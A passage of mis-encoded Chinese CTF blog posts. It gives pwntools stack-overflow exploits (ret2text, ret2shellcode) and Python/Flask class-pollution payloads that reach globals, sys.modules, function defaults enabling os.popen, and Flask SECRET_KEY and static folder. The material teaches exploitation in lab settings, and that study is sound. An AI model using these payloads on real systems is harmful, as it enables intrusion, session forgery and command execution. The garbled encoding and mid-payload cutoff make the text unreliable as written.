0 ; timer .text:0804860A call _time .text:0804860F mov [esp], eax ; seed .text:08048612 call _srand .text:08048617 call _rand .text:0804861C mov [ebp+secretcode], eax .text:0804861F lea eax, [ebp+input] .text:08048622 mov [esp+4], eax .text:08048626 mov dword ptr [esp], offset unk_8048760 .text:0804862D call ___isoc99_scanf .text:08048632 mov eax, [ebp+input] .text:08048635 cmp eax, [ebp+secretcode] .text:08048638 jnz short locret_8048646 .text:0804863A mov dword ptr [esp], offset command ; \u0026#34;/bin/sh\u0026#34; .text:08048641 call _system ç„¶åå¯ä»¥çœ‹åˆ°åœ°å€0804863Aä¸­æœ‰ä¸€ä¸ª/bin/shæ¥æ‰§è¡Œå‘½ä»¤çš„åé—¨ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è®©retè·³åˆ°è¿™ä¸ªä½ç½®æ‰§è¡Œå‘½ä»¤å³å¯\né‚£ä¹ˆç°åœ¨å°±æ˜¯è¦è®¡ç®—ä¸€ä¸‹getsåˆ°ebpçš„ç›¸å¯¹ä½ç½® é€šè¿‡GDBæ–­ç‚¹è°ƒè¯•\n$eax : 0xffffcd5c â†’ 0x08048329 â†’ \u0026#34;__libc_start_main\u0026#34;\r$ebx : 0x00000000\r$ecx : 0xffffffff\r$edx : 0xf7faf870 â†’ 0x00000000\r$esp : 0xffffcd40 â†’ 0xffffcd5c â†’ 0x08048329 â†’ \u0026#34;__libc_start_main\u0026#34;\r$ebp : 0xffffcdc8 â†’ 0x00000000\r$esi : 0xf7fae000 â†’ 0x001b1db0\r$edi : 0xf7fae000 â†’ 0x001b1db0\r$eip : 0x080486ae â†’ \u0026lt;main+102\u0026gt; call 0x8048460 \u0026lt;gets@plt\u0026gt; å¯ä»¥çœ‹åˆ°espå’Œebpçš„åœ°å€ä»¥åŠsçš„åœ°å€ å°±å¯ä»¥è®¡ç®—å‡ºæ¥ebpå’Œsçš„ç›¸å¯¹ä½ç½® s ç›¸å¯¹äº ebp çš„åç§»ä¸º 0x6c ç„¶åå†åŠ ä¸Š4å­—èŠ‚è·³åˆ°retè¿›è¡Œè·³è½¬å³å¯ exp.py\nfrom pwn import * fi = process(\u0026#39;./ret2text\u0026#39;) addr = 0x0804863A #è¦è·³è½¬çš„åœ°å€ playload = b\u0026#39;a\u0026#39;*0x6c+b\u0026#39;b\u0026#39;*0x04+p32(addr) fi.sendline(playload) fi.interacitve() è¿™æ ·å­å°±å¯ä»¥è¿›è¡Œè°ƒç”¨shæ¥è·å–flagäº†\nret2shellcode #\rè¿™ä¸ªæ¼æ´çš„ä½¿ç”¨æ–¹æ³•å’ŒRET2TEXTä¸€æ¨¡ä¸€æ ·ï¼ŒåŒºåˆ«å°±åœ¨äºä»–æ²¡æœ‰å†…ç½®çš„åé—¨ï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±å»å†™ä¸€ä¸ªshellcodeæ¥è¿›è¡Œgetshell\nå¯ä»¥çœ‹ä¸€ä¸‹è¿™é“é¢˜\nint __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(\u0026#34;No system for you this time !!!\u0026#34;); gets((char *)\u0026amp;v4); strncpy(buf2, (const char *)\u0026amp;v4, 0x64u); printf(\u0026#34;bye bye ~\u0026#34;); return 0; } è¿™é‡Œå°±åšäº†ä¸¤ä¸ªå…³é”®çš„æ“ä½œå°±æ˜¯ä¸€ä¸ªæ˜¯getsä¸€ä¸ªæ˜¯strncpyï¼Œä»–å°†è¾“å…¥çš„0x64ä¸ªå­—ç¬¦ä¹Ÿå°±æ˜¯100ä¸ªå­—ç¬¦å¤åˆ¶åˆ°äº†buf2çš„åœ°å€ä¸Šå»ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„æ€è·¯æ˜¯è¿™æ ·çš„ï¼š é¦–å…ˆæˆ‘ä»¬è¿˜æ˜¯è¦å…ˆè®¡ç®—getsåˆ°ebpçš„è·ç¦»ï¼Œå…¶å®å°±æ˜¯v4çš„åœ°å€åˆ°ebpçš„è·ç¦»ï¼Œç„¶åæˆ‘ä»¬æŠŠretè¦†ç›–æ‰åè®©ä»–è·³åˆ°buf2ä¸Šå»ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥æŠŠshellcodeå¤åˆ¶åˆ°buf2ä¸Šå»ï¼Œç„¶åè¿›è¡ŒåŠ«æŒã€‚\nå…·ä½“å¦‚ä¸‹ï¼šï¼ˆæ³¨æ„ä¸€ä¸‹è¿™é‡Œçš„.bssæ˜¯æœ‰å¯æ‰§è¡Œæƒé™çš„ï¼‰ ç„¶åbuf2çš„åœ°å€\n.bss:0804A080 public buf2 .bss:0804A080 ; char buf2[100] å¯ä»¥çœ‹åˆ°æ˜¯0x0804A080 ç„¶åsçš„ä½ç½®éœ€è¦GDBè‡ªå·±è°ƒè¯•ä¸€ä¸‹ï¼Œä¸èƒ½ç›´æ¥ç”¨0x64+0x04æ¥è®¡ç®—ï¼Œéœ€è¦çœ‹å®é™…sç›¸å¯¹äºespå’Œebpçš„è·ç¦»å†è®¡ç®—ã€‚è¿™é‡Œæˆ‘å°±ä¸åšç¤ºä¾‹äº†ç½‘ä¸Šéƒ½æœ‰åˆ†æçš„\nexp.py\nfrom pwn import * fi = process(\u0026#39;./ret2shellcode\u0026#39;) addr = 0x0804A080 shellcode = asm(shellcraft.sh())#åˆ¶ä½œshellcode playload = shellcode.ljust(112,b\u0026#39;A\u0026#39;) + p32(addr) fi.sendline(playload) fi.interactive() è¿™é‡Œçš„ljustæ–¹æ³•å°±æ˜¯å°†å…¶è¡¥é½åˆ°112ä¸ªå­—èŠ‚ï¼Œå› ä¸ºæˆ‘ä»¬è¦åˆ°retçš„åœ°å€ä¸Šé¢æ‰€ä»¥éœ€è¦è¡¥é½ã€‚\nreferenceï¼š https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2shellcode å†æ¬¡æ„Ÿè°¢Duskå¸ˆå‚…\n","date":"12 July 2024","externalUrl":null,"permalink":"/posts/baserop/","section":"Posts","summary":"","title":"åŸºæœ¬ROP","type":"posts"},{"content":"","date":"11 July 2024","externalUrl":null,"permalink":"/tags/python/","section":"Tags","summary":"","title":"Python","type":"tags"},{"content":"å‰è¨€ #\råœ¨ç ”ç©¶äº†NodejsåŸå‹é“¾æ±¡æŸ“ä¹‹åï¼Œæˆ‘æ³¨æ„åˆ°äº†å›½èµ›ä¸­å‡ºç°çš„ä¸€ä¸ªçŸ¥è¯†ç‚¹PythonåŸå‹é“¾æ±¡æŸ“ï¼ŒåŒæ—¶æˆ‘æ³¨æ„åˆ°CTFSHOWä¸Šçš„ä¸€ä¸ªé¢˜ç›®ï¼Œäºæ˜¯æˆ‘å¼€å§‹å­¦ä¹ å®ƒå¹¶å†™äº†è¿™ç¯‡ç®€å•çš„æ–‡ç« ã€‚\nä»Mergeå¼€å§‹ #\ræˆ‘ä»¬è¿™é‡Œè¿˜æ˜¯ä»å¸¸è§çš„mergeå‡½æ•°æ¥åšå…¥æ‰‹ä¸¾ä¾‹ï¼Œå› ä¸ºå…¶å®å¯¹äºåŸå‹é“¾æ±¡æŸ“æ¥è¯´ï¼Œæœ¬è´¨ä¸Šéƒ½æ˜¯ä¸€ä¸ªä¸œè¥¿ï¼Œåªæ˜¯åŸºäºä¸åŒçš„è¯­è¨€ç‰¹æ€§ï¼ŒæŸäº›å­˜åœ¨å±€é™æ€§ï¼Œä½†æ˜¯è®²åˆ°mergeå¤§å®¶éƒ½åº”è¯¥æƒ³åˆ°å’ŒåŸå‹é“¾æ±¡æŸ“æœ‰å…³ã€‚\nè¿™é‡Œæˆ‘å°±æŠŠè¿™ä¸ªå…³é”®çš„mergeçš„å®šä¹‰æ”¾åœ¨è¿™é‡Œï¼Œå…¶å®æ˜¯åŒnodejsä¸€æ ·çš„æ“ä½œ\ndef merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) å¯ä»¥çœ‹åˆ°ä¹Ÿæ˜¯é€šè¿‡é”®å€¼äº’æ¢æ¥è¿›è¡Œçš„æ±¡æŸ“ï¼Œä½†æ˜¯è¿™é‡Œè¦æ³¨æ„åœ¨pythonä¸­çš„objectçš„å±æ€§æ˜¯ä¸å¯ä»¥è¢«æ±¡æŸ“çš„ï¼Œå…·ä½“çš„åé¢ä¼šè¯´ã€‚\nä¸€ä¸ªæœ€ç®€å•çš„å®ä¾‹ï¼š\ndef merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) class ctfer: flag = \u0026#34;flag{fake_flag}\u0026#34; class Delete(ctfer): pass class Chu0(ctfer): pass class Kengwang(ctfer): pass ctf1 = Delete() ctf2 = Chu0() evil_playload = { \u0026#34;__class__\u0026#34;: { \u0026#34;__base__\u0026#34;: { \u0026#34;flag\u0026#34;: \u0026#34;flag{really_flag}\u0026#34; } } } print(ctf1.flag) print(ctf2.flag) merge(evil_playload, ctf1) print(ctf1.flag) print(ctf2.flag) è¿è¡Œç»“æœï¼Œå¯ä»¥çœ‹åˆ°æ˜¯è¢«æ±¡æŸ“çš„äº† ç„¶åå…¶ä»–çš„ä¾‹å¦‚ä¿®æ”¹å†…ç½®å±æ€§ä¹Ÿæ˜¯okçš„è¿™é‡Œå°±ä¸å†™äº†ã€‚ è®°ä½objectçš„å±æ€§æ˜¯æ— æ³•è¢«æ±¡æŸ“çš„`\nmerge(evil_playload,object) print(object) #TypeError: cannot set \u0026#39;flag\u0026#39; attribute of immutable type \u0026#39;object\u0026#39; å¯ä»¥çœ‹åˆ°ä¼šæŠ¥é”™çš„\nQuestion1 #\rè¿™é‡Œå°±äº§ç”Ÿäº†ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬åœ¨ä¸Šè¿°çš„å†™æ³•å½“ä¸­æ˜¯åˆ©ç”¨Deleteå»ç»§æ‰¿äº†ctferè¿™ä¸ªç±»çš„ï¼Œè¿™æ ·å­æˆ‘ä»¬æ‰å¯ä»¥é€šè¿‡åŸºç±»å»æ±¡æŸ“å…¶å±æ€§å€¼ï¼Œä½†æ˜¯å¦‚æœä¸å­˜åœ¨è¿™ä¸ªç»§æ‰¿å…³ç³»çš„æ—¶å€™æˆ‘ä»¬åº”è¯¥å¦‚ä½•å»æ±¡æŸ“å‘¢ï¼Ÿ\n_\\globals__ #\ræˆ‘ä»¬å°±å¯ä»¥å»æ€ç´¢ä¸€ä¸‹å…³äºpythonçš„ä¸€äº›é—®é¢˜ï¼Œä¾‹å¦‚åœ¨SSTIä¸­æˆ‘ä»¬æ˜¯å¦‚ä½•å»è·å–æˆ‘ä»¬å¯ç”¨çš„å±æ€§æˆ–è€…è¯´æ–¹æ³•å‘¢ï¼Ÿ åº”è¯¥å¾ˆç›´è§‚å°±èƒ½æƒ³åˆ°ï¼Œæ˜¯ä»–â€”â€”__globals__. __globals__ æ˜¯ Python å‡½æ•°å¯¹è±¡çš„ä¸€ä¸ªå±æ€§ï¼Œå®ƒè¿”å›åŒ…å«å‡½æ•°å®šä¹‰æ—¶çš„å…¨å±€å˜é‡çš„å­—å…¸ã€‚é€šè¿‡è¿™ä¸ªå±æ€§ï¼Œä½ å¯ä»¥è®¿é—®å’Œä¿®æ”¹å‡½æ•°å®šä¹‰æ‰€åœ¨çš„æ¨¡å—ä¸­çš„å…¨å±€å˜é‡ã€‚\nx = 10 # å…¨å±€å˜é‡ def my_function(): print(x) # æ‰“å°å…¨å±€å˜é‡ x def modify_global_var(): my_function.__globals__[\u0026#39;x\u0026#39;] = 20 # ä¿®æ”¹å…¨å±€å˜é‡ x my_function() # è¾“å‡º 10 modify_global_var() my_function() # è¾“å‡º 20 å¯ä»¥çœ‹åˆ°å®ä¾‹å½“ä¸­æˆ‘ä»¬é€šè¿‡è¿™ä¸ªå±æ€§æ¥æ”¹å˜äº†å…¨å±€å˜é‡ä¸­çš„xã€‚\næ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥è¿™æ ·å»æ„é€ ä¸€ä¸‹playload\nevil_playload = { \u0026#34;__init__\u0026#34;:{ \u0026#34;__globals__\u0026#34;:{ \u0026#34;flag\u0026#34; : \u0026#34;flag{really_flag}\u0026#34; } } } è¿™æ ·å­å°±å¯ä»¥å»åº”å¯¹äºä¸å­˜åœ¨ç»§æ‰¿é“¾çš„æƒ…å†µ\nQuestion2 #\ræˆ‘ä»¬å†æƒ³è¦ä¸€ä¸ªåœºæ™¯ï¼Œè™½ç„¶è¯´åœ¨ä¸€äº›é¢˜ç›®åœºæ™¯æ¥è¯´ï¼Œå¤§å¤šéƒ½æ˜¯åœ¨main.pyä¸­å»importä¸€ä¸ªtest.pyï¼Œå¹¶ä¸”å…³ç³»æ¯”è¾ƒç®€å•çš„æ—¶å€™ï¼Œé€šå¸¸éƒ½å¯ä»¥åˆ©ç”¨ä¸Šé¢çš„æ–¹æ³•æ¥è¿›è¡Œæ±¡æŸ“ï¼Œå½“å…³ç³»æ¯”è¾ƒå¤æ‚çš„æ—¶å€™å°±æ¯”è¾ƒéº»çƒ¦ï¼Œä¾‹å¦‚å¤šå±‚import æˆ–è€…å¯¼å…¥ç¬¬ä¸‰æ–¹åº“æ¥å¯¼å…¥çš„æ—¶å€™æ¯”è¾ƒéº»çƒ¦ï¼Œè¿™é‡Œå°±æä¾›äº†å‡ ä¸ªæ–¹æ³•\nModule sys #\ræˆ‘ä»¬è¿™é‡Œå°±å¯ä»¥åˆ©ç”¨sysæ¥å®ç°ã€‚è¿™ä¸ªåº”è¯¥ä¸ç”¨å¤šè¯´äº†\nmain.py\nimport test1 import sys def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) class Test(): def __init__(self): pass evil_playload = { \u0026#34;__init__\u0026#34;:{ \u0026#34;__globals__\u0026#34;:{ \u0026#34;sys\u0026#34;:{ \u0026#34;modules\u0026#34;:{ \u0026#34;test1\u0026#34;:{ \u0026#34;Test1\u0026#34;: { \u0026#34;flag\u0026#34; :\u0026#34;flag{really_flag}\u0026#34; } } } } } } } test = Test() print(test1.Test1.flag) merge(evil_playload,test) print(test1.Test1.flag) test1.py\nclass Test1: flag = \u0026#34;flag{fake_flag}\u0026#34; LoaderåŠ è½½å™¨ #\ræˆ‘ä»¬çš„sysä½¿ç”¨æ˜¯åœ¨é¢˜ç›®ç¯å¢ƒä¸­æœ‰ç»™ä½ sysçš„æƒ…å†µä¸‹æ‰ä¼šå¯ä»¥ä½¿ç”¨çš„ï¼Œä½†æ˜¯å¦‚æœé¢˜ç›®ä¸ç»™ä½ ï¼Œé‚£ä¹ˆsysåŸºæœ¬ä¸Šä¹Ÿæ˜¯Gäº†ï¼Œæ‰€ä»¥å’±ä»¬å°±ç€æ‰‹ä¸€ä¸‹å…¶ä»–æ–¹é¢\nä¸ºäº†è¿›ä¸€æ­¥ä¼˜åŒ–ï¼Œè¿™é‡Œé‡‡ç”¨æ–¹å¼æ˜¯åˆ©ç”¨Pythonä¸­åŠ è½½å™¨loaderï¼Œåœ¨å®˜æ–¹æ–‡æ¡£ä¸­ç»™å‡ºçš„å®šä¹‰æ˜¯ ä¹Ÿå°±æ˜¯åŠ è½½ç±»çš„ä¸œè¥¿ã€‚\nabout spec #\r__spec__å†…ç½®å±æ€§åœ¨Python 3.4ç‰ˆæœ¬å¼•å…¥ï¼Œå…¶åŒ…å«äº†å…³äºç±»åŠ è½½æ—¶çš„ä¿¡æ¯ï¼Œæœ¬èº«æ˜¯å®šä¹‰åœ¨Lib/importlib/_bootstrap.pyçš„ç±»ModuleSpecï¼Œæ˜¾ç„¶å› ä¸ºå®šä¹‰åœ¨importlibæ¨¡å—ä¸‹çš„pyæ–‡ä»¶ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥é‡‡ç”¨\u0026lt;æ¨¡å—å\u0026gt;.__spec__.__init__.__globals__['sys']è·å–åˆ°sysæ¨¡å—\næ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ä»»æ„çš„ç±»æ¥è¿›è¡ŒåŠ è½½sysä»è€Œè¾¾åˆ°å‰é¢çš„ç›®çš„ è¿™é‡Œæœ‰ä¸ªdemoå¯ä»¥çœ‹çœ‹â€˜\nimport math # è·å–æ¨¡å—çš„loader loader = math.__spec__.__init__.__globals__[\u0026#39;sys\u0026#39;] # æ‰“å°loaderä¿¡æ¯ print(loader.modules) # {\u0026#39;sys\u0026#39;: \u0026lt;module \u0026#39;sys\u0026#39; (built-in)\u0026gt;, \u0026#39;builtins\u0026#39;: \u0026lt;module \u0026#39;builtins\u0026#39; (built-in)\u0026gt;, \u0026#39;_frozen_importlib\u0026#39;: \u0026lt;module \u0026#39;_frozen_importlib\u0026#39; (frozen)\u0026gt;, ....... å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å°±å¯ä»¥è¿™ä¹ˆå»è°ƒç”¨ä»è€Œå»æ­é…åˆ©ç”¨æ‰“ç»„åˆæ‹³\né»˜è®¤å€¼æ›¿æ¢ #\rå‡½æ•°å½¢å‚ #\rä¸»è¦ç”¨åˆ°äº†å‡½æ•°çš„__defaults__å’Œ__kwdefaults__è¿™ä¸¤ä¸ªå†…ç½®å±æ€§\n__defaults__ #\r__defaults__ æ˜¯ Python å‡½æ•°å¯¹è±¡çš„ä¸€ä¸ªå±æ€§ï¼Œå®ƒåŒ…å«å‡½æ•°çš„é»˜è®¤å‚æ•°å€¼ã€‚__defaults__ è¿”å›ä¸€ä¸ªåŒ…å«é»˜è®¤å‚æ•°å€¼çš„å…ƒç»„ã€‚å¦‚æœå‡½æ•°æ²¡æœ‰é»˜è®¤å‚æ•°ï¼Œ__defaults__ è¿”å› Noneã€‚\nå…·ä½“çš„å†…å®¹å¯ä»¥çœ‹è¿™é‡Œ pythonå‡½æ•°çš„ä½ç½®å‚æ•°(Positional)å’Œå…³é”®å­—å‚æ•°(keyword) - çŸ¥ä¹ (zhihu.com)\næ ¹æ®æ–‡ç« çš„æœ€åé¢ï¼Œæˆ‘ä»¬å¯ä»¥æ€»ç»“ä¸€ä¸‹(å·§è®°ä¸€ä¸‹)ï¼š\n/å‰é¢éƒ½ä¸ºä»…ä½ç½®å‚æ•° / å*å‰éƒ½ä¸ºä½ç½®æˆ–å…³é”®å­—å‚æ•° *åéƒ½ä¸ºä»…å…³é”®å­—å‚æ•° ä»…ä½ç½®å‚æ•°ä¸å¯ä»¥åˆ©ç”¨å˜é‡å = å˜é‡èµ‹å€¼ï¼Œä½ç½®æˆ–å…³é”®å­—å‚æ•°å¯ä»¥åˆ©ç”¨å…¶èµ‹å€¼ï¼Œä¹Ÿå¯ä»¥ä¸èµ‹å€¼ï¼Œä»…å…³é”®è¯å‚æ•°å¿…é¡»ç”¨å˜é‡å=å€¼æ¥èµ‹å€¼ def func_a(var_1, var_2 =2, var_3 = 3): pass def func_b(var_1, /, var_2 =2, var_3 = 3): pass def func_c(var_1, var_2 =2, *, var_3 = 3): pass def func_d(var_1, /, var_2 =2, *, var_3 = 3): pass print(func_a.__defaults__) #(2, 3) print(func_b.__defaults__) #(2, 3) print(func_c.__defaults__) #(2,) print(func_d.__defaults__) #(2,) æ‰€ä»¥åœ¨æ±¡æŸ“ä¸­å¯ä»¥è¿™æ ·\ndef evil(arg_1 , shell = False): if not shell: print(arg_1) else: print(__import__(\u0026#34;os\u0026#34;).popen(arg_1).read()) evil_playload = { \u0026#34;__init__\u0026#34;:{ \u0026#34;__globals__\u0026#34;:{ \u0026#34;evil\u0026#34;:{ \u0026#34;__defaults__\u0026#34;:{ True, } } } } } å…¶å®ä¹Ÿå°±æ˜¯æˆ‘ä»¬å¦‚æœå»è·å–evilå‡½æ•°çš„defalutså±æ€§çš„æ—¶å€™å°±åªèƒ½è·å–åˆ°ä½ç½®æˆ–å…³é”®å­—å‚æ•°ï¼Œæ‰€ä»¥è¿™é‡Œçš„defaultsé»˜è®¤æŒ‡å‘çš„å°±æ˜¯shellè¿™ä¸ªå‚æ•°ï¼Œæ‰€ä»¥å°±å¯ä»¥è¿›è¡Œæ±¡æŸ“\n__kwdefaluts__ #\r__kwdefaults__ä»¥å­—å…¸çš„å½¢å¼æŒ‰ä»å·¦åˆ°å³çš„é¡ºåºæ”¶å½•äº†å‡½æ•°é”®å€¼å½¢å‚çš„é»˜è®¤å€¼ï¼Œä»ä»£ç ä¸Šæ¥çœ‹ï¼Œåˆ™æ˜¯å¦‚ä¸‹çš„æ•ˆæœï¼š\ndef func_a(var_1, var_2 =2, var_3 = 3): pass def func_b(var_1, /, var_2 =2, var_3 = 3): pass def func_c(var_1, var_2 =2, *, var_3 = 3): pass def func_d(var_1, /, var_2 =2, *, var_3 = 3): pass print(func_a.__kwdefaults__) #None print(func_b.__kwdefaults__) #None print(func_c.__kwdefaults__) #{\u0026#39;var_3\u0026#39;: 3} print(func_d.__kwdefaults__) #{\u0026#39;var_3\u0026#39;: 3} å¯ä»¥çœ‹åˆ°ä»–ä»…è·å–äº†ä»…å…³é”®å­—å‚æ•°ï¼Œå¹¶ä¸”è¿”å›æ˜¯ä»¥å­—å…¸çš„å½¢å¼è¿”å›çš„ã€‚\næ‰€ä»¥åŒæ ·çš„\ndef evil(arg_1 ,*,shell = False): if not shell: print(arg_1) else: print(__import__(\u0026#34;os\u0026#34;).popen(arg_1).read()) evil_payload = { \u0026#34;__init__\u0026#34; : { \u0026#34;__globals__\u0026#34; : { \u0026#34;evilFunc\u0026#34; : { \u0026#34;__kwdefaults__\u0026#34; : { \u0026#34;shell\u0026#34; : True } } } } } è¿™æ ·å­å°±å¯ä»¥è¿›è¡Œæ±¡æŸ“äº†ã€‚\nç‰¹å®šå€¼æ±¡æŸ“ #\rç¯å¢ƒå˜é‡æ±¡æŸ“ #\råœ¨è¿™å‡ å¤©çš„iæ˜¥ç§‹çš„æ¯”èµ›å½“ä¸­å‡ºäº†è¿™ä¹ˆä¸€ä¸ªèµ›é¢˜\n\u0026lt;?php highlight_file(__FILE__); error_reporting(E_ALL); ini_set(\u0026#39;display_errors\u0026#39;, 1); function filter($a) { $pattern = array(\u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;,\u0026#39;%\u0026#39;,\u0026#39;\\(\u0026#39;,\u0026#39;\\)\u0026#39;,\u0026#39;;\u0026#39;,\u0026#39;bash\u0026#39;); $pattern = \u0026#39;/\u0026#39; . implode(\u0026#39;|\u0026#39;, $pattern) . \u0026#39;/i\u0026#39;; if(preg_match($pattern,$a)){ die(\u0026#34;No injecting!!!\u0026#34;); } return $a; } class ENV{ public $key; public $value; public $math; public function __toString() { $key=filter($this-\u0026gt;key); $value=filter($this-\u0026gt;value); putenv(\u0026#34;$key=$value\u0026#34;); system(\u0026#34;cat hints.txt\u0026#34;); } public function __wakeup() { if (isset($this-\u0026gt;math-\u0026gt;flag)) { echo getenv(\u0026#34;LD_PRELOAD\u0026#34;); echo \u0026#34;YesYes\u0026#34;; } else { echo \u0026#34;YesYesYes\u0026#34;; } } } class DIFF{ public $callback; public $back; private $flag; public function __isset($arg1) { system(\u0026#34;cat /flag\u0026#34;); $this-\u0026gt;callback-\u0026gt;p; echo \u0026#34;You are stupid, what exactly is your identity?\u0026#34;; } } class FILE{ public $filename; public $enviroment; public function __get($arg1){ if(\u0026#34;hacker\u0026#34;==$this-\u0026gt;enviroment){ echo \u0026#34;Hacker is bad guy!!!\u0026#34;; } } public function __call($function_name,$value) { if (preg_match(\u0026#39;/\\.[^.]*$/\u0026#39;, $this-\u0026gt;filename, $matches)) { $uploadDir = \u0026#34;/tmp/\u0026#34;; $destination = $uploadDir . md5(time()) . $matches[0]; if (!is_dir($uploadDir)) { mkdir($uploadDir, 0755, true); } file_put_contents($this-\u0026gt;filename, base64_decode($value[0])); if (rename($this-\u0026gt;filename, $destination)) { echo \u0026#34;æ–‡ä»¶æˆåŠŸç§»åŠ¨åˆ°${destination}\u0026#34;; } else { echo \u0026#39;æ–‡ä»¶ç§»åŠ¨å¤±è´¥ã€‚\u0026#39;; } } else { echo \u0026#34;éæ³•æ–‡ä»¶åã€‚\u0026#34;; } } } class FUN{ public $fun; public $value; public function __get($name) { echo \u0026#34;Hacker!aaaaaaaaaaaaa\u0026#34;; $this-\u0026gt;fun-\u0026gt;getflag($this-\u0026gt;value); } } è¿™ä¸ªæ˜¯æ‰“phpçš„ld_preload ç„¶åå¦‚æœè¯´ä»–æ˜¯åˆ©ç”¨pythonæ¥å†™çš„é¢˜ç›®çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ±¡æŸ“ç¯å¢ƒå˜é‡æ¥æ‰“ld_preloadåŠ«æŒï¼Œæœ‰äº›æ—¶å€™è¯´ä¸å®šè¿˜èƒ½æ‰“å‡ºéé¢„æœŸï¼Œå˜»å˜»ã€‚\nflaskç‰¹å®šå±æ€§æ±¡æŸ“ #\rå¯†é’¥æ›¿æ¢ #\rè¿™é‡Œç›´æ¥è´´ä»£ç å§ï¼Œå¯ä»¥é€ æˆä»»æ„sessionä¼ªé€ ç”šè‡³æ”¹å˜pinç \nfrom flask import Flask,request import json app = Flask(__name__) def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) class cls(): def __init__(self): pass instance = cls() @app.route(\u0026#39;/\u0026#39;,methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) def index(): if request.data: merge(json.loads(request.data), instance) return \u0026#34;[+]Config:%s\u0026#34;%(app.config[\u0026#39;SECRET_KEY\u0026#39;]) app.run(host=\u0026#34;0.0.0.0\u0026#34;) æ±¡æŸ“é“¾\n{ \u0026#34;__init__\u0026#34; : { \u0026#34;__globals__\u0026#34; : { \u0026#34;app\u0026#34; : { \u0026#34;config\u0026#34; : { \u0026#34;SECRET_KEY\u0026#34; :\u0026#34;Polluted~\u0026#34; } } } } } _got_first_requestæ±¡æŸ“ #\rç”¨äºåˆ¤å®šæ˜¯å¦æŸæ¬¡è¯·æ±‚ä¸ºè‡ªFlaskå¯åŠ¨åç¬¬ä¸€æ¬¡è¯·æ±‚ï¼Œæ˜¯Flask.got_first_requestå‡½æ•°çš„è¿”å›å€¼ï¼Œæ­¤å¤–è¿˜ä¼šå½±å“è£…é¥°å™¨app.before_first_requestçš„è°ƒç”¨ï¼Œè€Œ_got_first_requestå€¼ä¸ºå‡æ—¶æ‰ä¼šè°ƒç”¨ï¼š\nfrom flask import Flask,request import json app = Flask(__name__) def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) class cls(): def __init__(self): pass instance = cls() flag = \u0026#34;Is flag here?\u0026#34; @app.before_first_request def init(): global flag if hasattr(app, \u0026#34;special\u0026#34;) and app.special == \u0026#34;U_Polluted_It\u0026#34;: flag = open(\u0026#34;flag\u0026#34;, \u0026#34;rt\u0026#34;).read() @app.route(\u0026#39;/\u0026#39;,methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) def index(): if request.data: merge(json.loads(request.data), instance) global flag setattr(app, \u0026#34;special\u0026#34;, \u0026#34;U_Polluted_It\u0026#34;) return flag app.run(host=\u0026#34;0.0.0.0\u0026#34;) é“¾å­\npayload={ \u0026#34;__init__\u0026#34;:{ \u0026#34;__globals__\u0026#34;:{ \u0026#34;app\u0026#34;:{ \u0026#34;_got_first_request\u0026#34;:False } } } } _static_url_pathæ±¡æŸ“ #\r@app.route(\u0026#39;/\u0026#39;,methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) def index(): if request.data: merge(json.loads(request.data), instance) return \u0026#34;flag in ./flag but heres only static/index.html\u0026#34; payload={ \u0026#34;__init__\u0026#34;:{ \u0026#34;__globals__\u0026#34;:{ \u0026#34;app\u0026#34;:{ \u0026#34;_static_folder\u0026#34;:\u0026#34;./\u0026#34; } } } } os.path.pardir #\r#app.py from flask import Flask,request import json app = Flask(__name__) def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) class cls(): def __init__(self): pass instance = cls() @app.route(\u0026#39;/\u0026#39;,methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) def index(): if request.data: merge(json.loads(request.data), instance) return \u0026#34;flag in ./flag but heres only static/index.html\u0026#34; app.run(host=\u0026#34;0.0.0.0\u0026#34;) è¿™é‡Œæ˜¯åˆ©ç”¨ç‰¹æ€§\npayload={ \u0026#34;__init__\u0026#34;:{ \u0026#34;__globals__\u0026#34;:{ 